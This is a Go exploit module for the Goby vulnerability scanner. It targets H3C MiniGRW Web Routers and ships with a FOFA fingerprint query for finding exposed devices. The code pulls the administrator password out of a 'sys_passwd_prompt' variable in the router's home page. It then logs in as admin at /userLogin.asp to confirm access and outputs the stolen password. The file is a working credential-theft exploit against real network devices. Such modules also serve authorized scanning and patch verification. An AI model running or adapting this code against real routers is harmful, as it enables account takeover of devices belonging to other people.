package exploits

import (
	"fmt"
	"regexp"
	"strings"
	"unicode"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "H3C MiniGRW Web Router sys_passwd_prompt Information Disclosure ",
    "Description": "<p>H3C MiniGRW Web Router is a series of routers.</p><p>H3C MiniGRW Web Router has a security vulnerability. The reason for the vulnerability is that the /userLogin.asp page leaks the administrator account password, and attackers can log in to control the background.</p>",
    "Product": "H3C MiniGRW Web Router",
    "Homepage": "https://www.h3c.com/cn",
    "DisclosureDate": "2022-08-25",
    "Author": "abszse",
    "FofaQuery": "body=\"sys_passwd_prompt\"",
    "GobyQuery": "body=\"sys_passwd_prompt\"",
    "Level": "2",
    "Impact": "<p>H3C MiniGRW Web Router has a security vulnerability. The reason for the vulnerability is that the /userLogin.asp page leaks the administrator account password, and attackers can log in to control the background.</p>",
    "Recommendation": "<p>At present, the manufacturer has released a patch, please pay attention to the official website update in time: <a href=\"https://www.h3c.com/cn.\">https://www.h3c.com/cn.</a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "H3C MiniGRW Web 路由器 sys_passwd_prompt 信息泄漏漏洞",
            "Product": "H3C MiniGRW Web Router",
            "Description": "<p>H3C MiniGRW Web Router 是同一系列的多款路由器。<br></p><p>H3C MiniGRW Web Router 存在安全漏洞，漏洞原因在于/userLogin.asp页面泄漏了管理员账号密码，攻击者可登录控制后台。<br></p>",
            "Recommendation": "<p>目前厂商已发布补丁，请及时关注官网更新：<a href=\"https://www.h3c.com/cn\">https://www.h3c.com/cn</a>。<br></p>",
            "Impact": "<p>H3C MiniGRW Web Router 存在安全漏洞，漏洞原因在于/userLogin.asp页面泄漏了管理员账号密码，攻击者可登录控制后台。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "H3C MiniGRW Web Router sys_passwd_prompt Information Disclosure ",
            "Product": "H3C MiniGRW Web Router",
            "Description": "<p>H3C MiniGRW Web Router is a series of routers.<br></p><p>H3C MiniGRW Web Router has a security vulnerability. The reason for the vulnerability is that the /userLogin.asp page leaks the administrator account password, and attackers can log in to control the background.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released a patch, please pay attention to the official website update in time: <a href=\"https://www.h3c.com/cn.\">https://www.h3c.com/cn.</a><br></p>",
            "Impact": "<p>H3C MiniGRW Web Router has a security vulnerability. The reason for the vulnerability is that the /userLogin.asp page leaks the administrator account password, and attackers can log in to control the background.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10701"
}`

  IsChineseChar := func(str string) bool {
		for _, r := range str {
			if unicode.Is(unicode.Scripts["Han"], r) {
				return true
			}
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = true
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "sys_passwd_prompt") {

				PasswordInfo := regexp.MustCompile("var sys_passwd_prompt =\"(.*?)\";").FindStringSubmatch(resp.Utf8Html)

				//return PasswordInfo[1] != "" && len(PasswordInfo[1]) > 4 && !IsChineseChar(PasswordInfo[1])
				if PasswordInfo[1] != "" && len(PasswordInfo[1]) > 4 && !IsChineseChar(PasswordInfo[1]) {
					uri2 := "/userLogin.asp"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg2.Header.Store("Referer", u.FixedHostInfo+"/userLogin.asp")
					cfg2.Data = fmt.Sprintf("save2Cookie=&vldcode=&account=admin&password=%s&btnSubmit=+%%B5%%C7%%C2%%BC+", PasswordInfo[1])
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						return resp2.StatusCode == 200 && strings.Contains(resp2.Utf8Html, "系统登录中...")
					}
				}

			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri1 := "/"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = true
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "sys_passwd_prompt") {

				PasswordInfo := regexp.MustCompile("var sys_passwd_prompt =\"(.*?)\";").FindStringSubmatch(resp.Utf8Html)
				expResult.Output = "Password: " + PasswordInfo[1]
				expResult.Success = true
			}
			return expResult
		},
	))
}